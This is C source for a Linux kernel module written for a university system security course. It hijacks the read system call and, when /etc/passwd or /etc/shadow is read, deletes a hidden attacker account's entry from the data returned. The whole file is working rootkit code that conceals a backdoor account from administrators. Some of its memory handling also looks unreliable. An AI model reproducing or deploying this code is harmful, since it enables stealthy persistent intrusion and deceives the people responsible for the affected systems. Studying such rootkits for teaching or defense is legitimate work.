/**********************************************************
	Last Updated: Nov 16, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Functions related to hijack a 'read' system call
***********************************************************/

#include "../headers/all.h"
#include "../headers/HJ_read.h"

EXPORT_SYMBOL(my_read);
extern asmlinkage long (*original_read)(unsigned int, char*, size_t);

asmlinkage long
my_read(unsigned int fd, char *buf, size_t count) {

	struct file *file;

	
	char *ptr1, *ptr2, *ptr3;
	int i, buf_len_to_copy;
	
	char* abs_path;
	char *tmp, *buf2;
	
	struct path file_path;
	unsigned long ret;
	
	file = fget(fd);
	
	if (file) {
		
		// Get the absolute path of current file
		file_path = file->f_path;
		path_get(&file->f_path);
		tmp = (char *)__get_free_page(GFP_TEMPORARY);
		abs_path = d_path(&file_path, tmp, PAGE_SIZE);
		path_put(&file_path);
		free_page(tmp);
		
		ret = original_read(fd, buf, count);
		
		// If the targeted file and some sanity checks
		if(ret && (strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0)) {
			//printk("[FD]: 0x%x, dev: 0x%x, mode: 0x%x, size: 0x%x\n", fd, file_dev, file_mode, file_size);
			
			// Allocate new buffer and copy string from user space
			buf2 = kmalloc(ret, GFP_KERNEL);
			copy_from_user(buf2, buf, ret);
			
			if (DEBUG == 1) {
				printk("READ: %s\n", abs_path);
				printk("[BufSize before manipulation]:%ld\n", strlen(buf2));
			}
			
			/* 
				Do string manipulation to hide an attacker's account
				Set the three pointers, and leave out the target 
			*/
			ptr1 = buf2;
			ptr2 = strstr(buf2, hide_str);
			ptr3 = ptr2;
			
			while (*ptr3 != *delimiter)
				ptr3++;
				
			ret -= (unsigned long)(ptr3 - ptr2);
			buf_len_to_copy = ptr1 + strlen(buf2) - ptr3;
			
			if (DEBUG == 1) {
				printk("buf_len_to_copy: %d, ret: %ld\n", buf_len_to_copy, ret);
				printk("Ptr1(Contents): %p, Ptr2(hide_str): %p, Ptr3(end hide_str): %p\n", ptr1, ptr2, ptr3);
			}
			
			ptr3++;
			for (i = 0; i < buf_len_to_copy; i++)
				*ptr2++ = *ptr3++;
			buf2[(void*)ptr2 - (void*)ptr1] = NULL;
			
			if (DEBUG == 1) 
				printk("[BufSize after manipulation]: %ld\n", strlen(buf2));
			
			// Copy the altered string to user space
			copy_to_user(buf, buf2, ret);
			
			// ret = file->f_op->read(tampered, buf2, strlen(buf), ptr2);
			// printk("fd: %d VS tampered_fd: %d\n%s\n", fd, tampered_fd, buf);
			
			if (DEBUG == 1) {
				printk("!!!!! ------------------------ \n%s", buf);
				printk("\n!!!!! ------------------------ \n");
			}
			
			//ret = vfs_read(file, buf, count, &pos);
			kfree(buf2);
		}
	}
	
	return ret;
	//return original_read(fd, buf, count);
}
